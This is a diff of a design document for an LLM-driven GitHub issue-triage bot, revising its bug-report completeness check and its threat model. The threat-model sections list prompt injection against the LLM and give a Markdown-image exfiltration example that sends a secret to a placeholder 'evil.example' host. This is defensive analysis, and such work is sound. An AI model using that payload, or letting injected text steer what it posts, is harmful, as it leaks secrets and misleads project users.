@@ -119,15 +119,18 @@ class DuplicateVerdict(BaseModel):
   - Stage 2: precision on `duplicate_of`, reported together with the dataset composition.
 
 ### R3. Completeness check
-- **Input:** issue body + issue type (from R1). The checklist depends on issue type, e.g. a feature request or question doesn't need logs.
-- **Decision:** for each of version, repro steps and logs: `missing`, `vague` or `ok`, plus a `note` (e.g. "says 'latest' instead of a version number").
+- **Input:** issue title + body, for issues classified as `bug` (from R1).
+- **Decision:** for each of version, repro steps and logs: `missing`, `vague`, `ok` or `not_needed`, plus a `note` (e.g. "the exact version number, not 'latest'").
 - **Output:** a `Completeness` object, written to shared state. R3 does not call HITL itself — the maintainer approves one combined draft in R6.
-- **Cost of error:** low (maintainer reviews).
+- **Cost of error:** low (maintainer reviews) — but false "missing" means nagging reporters in public.
 
 ```python
+FieldStatus = Literal["missing", "vague", "ok", "not_needed"]
+
+
 class FieldCheck(BaseModel):
-    status: Literal["missing", "vague", "ok"]
-    note: str  # e.g. "says 'latest' instead of a version number"
+    status: FieldStatus
+    note: str  # shown to the reporter when missing/vague; empty otherwise
 
 
 class Completeness(BaseModel):
@@ -135,10 +138,15 @@ class Completeness(BaseModel):
     repro_steps: FieldCheck
     logs: FieldCheck
 ```
+(Each field has a `Field(description=...)` defining ok / vague / not_needed for that specific field — see `models.py`.)
 
+- **Decisions for v1 (slice 2, 2026-10-21):**
+  1. **Bugs only.** Only `bug` issues get a completeness check; other types skip R3 (routing: `type == "bug"`). Missing information hurts most for bugs — a maintainer can't fix what they can't reproduce. Per-type checklists (features: use case; docs: which page) can come later if real issues show a need.
+  2. **A fourth status, `not_needed`.** Many bugs return a wrong value without any error (`bug.json`), so there are no logs to give. With only missing/vague/ok, the bot would ask for logs that don't exist — false nagging, exactly what R3's precision metric guards against. The "please add" section asks only for `missing` / `vague` fields. `version` and `repro_steps` are described as never `not_needed` for a bug.
+  3. **LLM call only; template rule later.** Real template headings differ per repository and only become available with the GitHub API (slice 4). The LLM call handles template and free-text issues alike. Add the rule (and its "skip the LLM when every field is missing" saving) when slice 4 data shows how often it would apply.
 - **Executor:**
-  - **Template issues:** a rule (regex on template headings) marks absent fields as `missing`. For the fields that are present, one structured LLM call judges whether the content is useful. The LLM call is skipped only if every field is missing.
-  - **Free-text issues:** one structured LLM call determines both presence and usefulness.
+  - **v1:** one structured LLM call (`Completeness` schema) for every bug.
+  - **Later (slice 4+):** template issues — a rule (regex on template headings) marks absent fields as `missing`; the LLM judges only the fields that are present; the LLM call is skipped if every field is missing.
   - **Not an agent:** the flowchart is fixed in advance; the LLM only fills in the values being checked, and code decides the path.
 - **Tools needed:** none.
 - **Production risks → mitigations:**
@@ -150,6 +158,14 @@ class Completeness(BaseModel):
   - **Precision on `missing`/`vague`** (primary) — of all the times we said "missing", how often were we right? Low precision means nagging reporters in public.
   - Accuracy / macro-F1 (secondary).
   - **Dataset:** ~50 hand-labelled issues. Positives: issues where a maintainer asked for more info (`needs-info` / `waiting-for-response` labels, or comments like "can you provide more details on…"). Negatives: issues maintainers acted on without asking for anything (fixed or labelled directly). Without negatives, false nagging can't be measured. A 25 + 25 mix ensures both error types appear, but its precision is higher than production's — also report precision at the real class ratio.
+  - **Grade at two levels.** Exact status per field, and — what the reporter experiences — **asked or not** (`missing`/`vague` ask; `ok`/`not_needed` don't). Count **false nags** (asked, shouldn't have) and **missed asks** separately; false nags are the primary metric.
+- **Findings from the slice 2 sample run** (2026-10-22, gpt-oss-120b, reasoning effort low; 5 bug samples × 3 fields = 15 field checks; a behaviour check, not an accuracy measure):
+  - 12/15 exact; at the asked/not-asked level **14/15 correct: 1 false nag, 0 missed asks**. Classification unaffected (13/13).
+  - ✅ `bug.json` → logs `not_needed` (wrong value, no error) and `bug_crash_no_logs.json` → logs `missing` ("throws an error", no text): the model separates these two cases.
+  - ⚠️ **False nag:** `bug_no_repro.json` ("doesn't work properly… gives wrong results", no error described) → logs `missing`, expected `not_needed`. The bot would ask for logs that don't exist. **Vague reports are where false nags come from** — and they are common in real repositories.
+  - Label errors with no effect on the reply: `bug_vague_version.json` logs `not_needed` although a traceback was given (expected `ok`); `bug_no_repro.json` repro `missing` vs expected `vague`.
+  - Cost/latency: bugs now make two LLM calls (~5–8 s vs ~2.5–4 s for other types).
+  - **Decision:** record now; fix with real data in slice 4 rather than tuning the prompt on one sample. Candidate fix to test then: tighten the `logs` description — *"missing only when an error, exception or crash is explicitly described; wrong output alone → not_needed; if error text or a traceback is included → ok"* — bump to `completeness-v2`, and check it removes false nags **without** creating missed asks (e.g. `bug_crash_no_logs.json`).
 
 ### R4. Reproduction (sandbox) — via Agent
 - **Input:** issue title + body, R1 type, R3 completeness.
@@ -235,7 +251,7 @@ class DraftResponse(BaseModel):
 | Section | When included | Executor | Filled from |
 |---|---|---|---|
 | Duplicate / related issues | R2 found candidates | Template | R2 verdict |
-| "Please add…" | R3 found `missing`/`vague` fields | Template | R3 statuses + notes |
+| "Please add…" | R3 found `missing`/`vague` fields | Template | R3 **statuses only** → fixed phrase per (field, status). The LLM's `note` is never posted (see §5.5) |
 | Reproduction result | R4 status is not `not_attempted` | Template | R4 verdict, script, output |
 | Answer | Type is `question` | **One structured LLM call** | Retrieved docs sections |
 
@@ -531,14 +547,14 @@ Reporter opens issue ──► GitHub ──POST /webhook {action: "opened", iss
 | Webhook payload | Anyone can POST to the URL until the signature is verified |
 | Retrieved past issues (R2) | Written by strangers, possibly long ago |
 | Sandbox output (R4) | Produced by attacker-influenced code |
-| **LLM output** | Its input contained untrusted text, so its output is untrusted too |
+| **LLM output** (e.g. `Classification.reasoning`, `FieldCheck.note`) | Its input contained untrusted text, so its output is untrusted too |
 | Maintainer-edited text (R6) | Trusted person, but free text going into a public comment |
 
 #### Sinks
 | Sink | Interprets | Possible attack | Defence | Status |
 |---|---|---|---|---|
 | LLM prompt | Instructions | Prompt injection; closing delimiter tags early | Delimiters + regex tag sanitising + system-prompt rule; no write tools; HITL | ✅ slice 1 |
-| GitHub comment | Markdown (`@mentions`, links, images) | Mass notifications, phishing links, tracking images | Templates never quote user text (tested); R5 URL allowlist; HITL | ✅ templates / ⏳ R5 |
+| GitHub comment | Markdown (`@mentions`, links, images, headings) | Mass notifications, phishing links, tracking images, injected formatting, re-posting secrets | Templates never quote user text **or LLM text** — the LLM chooses a status, the wording is a fixed phrase (both tested); R5 URL allowlist for LLM answers; HITL | ✅ templates + completeness phrases / ⏳ R5 answers |
 | GitHub labels | Label names | Invented labels | Only labels from a fixed list | ⏳ slice 3 |
 | Sandbox | Code | Secret theft, network abuse, resource exhaustion, escape | Sandbox hardening (R4) | ⏳ slice 8 |
 | Logs and traces | Text, newlines | Leaked secrets; forged log lines (log injection) | Redaction; structured (JSON) logging with user text as fields | ⏳ Week 3 |
@@ -550,6 +566,7 @@ Reporter opens issue ──► GitHub ──POST /webhook {action: "opened", iss
 - **XSS in the approval page** — new HTML sink in slice 7.
 - **Data exfiltration via Markdown images** — `![x](https://evil.example/?d=SECRET)` sends data when the comment renders. Already blocked by the R5 URL allowlist (because it's an allowlist).
 - **Log injection** — newlines in a title forge log lines. Fixed by structured logging in Week 3.
+- **LLM-written text in public comments** (slice 2) — `FieldCheck.note` is written by the LLM from attacker-influenced input. If posted, it could carry mentions, links, Markdown images, injected headings, or a quoted secret from the reporter's logs. **Decision: allowlist, not cleaning.** The LLM only *chooses* the status (a `Literal`); the public wording comes from `REQUEST_PHRASES`, keyed by (field, status). The note stays in the state for maintainers (approval page, slice 7). Rejected alternative: stripping `@`/URLs/images/newlines from the note — a denylist that misses variants (full-width `＠`, `evil[.]example`, Unicode tricks). Trade-off accepted: slightly less specific wording for the reporter; maintainers can refine it before approving. Tested by `test_llm_note_is_never_posted`.
 
 #### Attacker goals (for prioritising)
 Spam/harass under the project's name · phishing links · steal secrets · manipulate labels or close competitors' issues · run up costs · take over a maintainer account (XSS) · embarrass the project.
